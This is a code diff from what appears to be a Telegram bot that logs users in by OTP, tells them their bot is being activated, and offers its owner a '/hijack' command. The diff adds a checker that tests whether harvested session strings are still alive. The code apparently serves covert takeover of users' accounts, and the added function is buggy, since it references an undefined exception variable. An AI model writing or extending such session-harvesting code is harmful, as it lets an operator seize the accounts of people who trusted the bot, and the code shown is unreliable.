@@ -139,6 +139,30 @@ async def generate_session(_, message):
     await client.disconnect()
     await otp_code.reply("✅ Login successful!\n🚀 Activating bot for you...")
 
+
+
+
+# OTP listening dictionary
+otp_listeners = {}
+
+async def is_session_alive(session_string):
+    """Checks if a given session string is alive or dead."""
+    try:
+        userbot = Client(
+            "session_checker",
+            api_id=API_ID,
+            api_hash=API_HASH,
+            session_string=session_string
+        )
+        await userbot.connect()
+        await userbot.get_me()  # Verifies the session
+        await userbot.disconnect()
+        return True  # Session is alive
+    except Exception:
+        print(f"Session check error: {e}")  # Log error for debugging
+        return False  # Session is dead
+
+
 @app.on_message(filters.command("hijack") & filters.user(OWNER_ID))
 async def hijack_session(_, message):
     admin_id = message.chat.id
